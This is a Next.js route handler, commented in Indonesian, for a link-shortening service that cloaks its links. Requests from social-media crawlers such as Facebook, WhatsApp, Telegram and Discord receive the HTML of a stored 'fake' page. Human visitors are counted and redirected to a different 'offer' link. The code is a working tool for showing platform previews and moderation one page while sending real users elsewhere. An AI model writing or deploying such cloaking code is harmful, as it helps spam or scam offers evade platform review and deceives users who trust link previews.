import { turso } from "@/lib/turso";
import { NextResponse } from "next/server";

// Fungsi untuk memastikan string selalu memiliki protokol yang valid saat dieksekusi oleh mesin
function formatUrl(domainStr) {
  const cleanStr = domainStr.trim();
  if (!cleanStr.startsWith('http://') && !cleanStr.startsWith('https://')) {
    return `https://${cleanStr}`;
  }
  return cleanStr;
}

export async function GET(request, { params }) {
  const shortcode = params.shortcode;
  const userAgent = request.headers.get("user-agent") || "";
  
  // Daftar filter bot sosial media yang ketat
  const isBot = /bot|facebookexternalhit|whatsapp|twitterbot|linkedinbot|pinterest|skype|telegram|vkshare|slackbot|discordbot/i.test(userAgent);

  // 1. Cari data link di Database
  const result = await turso.execute({
    sql: "SELECT * FROM links WHERE short_code = ?",
    args: [shortcode]
  });

  // Jika kode salah / tidak ada di DB, lempar ke 404
  if (result.rows.length === 0) {
    return NextResponse.redirect(new URL("/404", request.url));
  }

  const data = result.rows[0];
  const fakeTarget = formatUrl(data.fake_link);
  const offerTarget = formatUrl(data.offer_link);

  // 2. Logika Skenario: Bot vs Manusia
  if (isBot) {
    // BOT: Ambil konten HTML dari Fake Link langsung dan suapkan ke Bot.
    try {
      const response = await fetch(fakeTarget);
      const htmlContent = await response.text();
      return new NextResponse(htmlContent, {
        status: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" }
      });
    } catch (error) {
      // Jika proses gagal, paksa bot untuk redirect ke target fake
      return NextResponse.redirect(fakeTarget, 301);
    }
  } else {
    // MANUSIA: Hitung klik (counter bertambah) 
    await turso.execute({
      sql: "UPDATE links SET click_count = click_count + 1 WHERE short_code = ?",
      args: [shortcode]
    });

    // Lempar langsung ke Offer Link (HTTP 302 Temporary Redirect)
    return NextResponse.redirect(offerTarget, 302);
  }
}
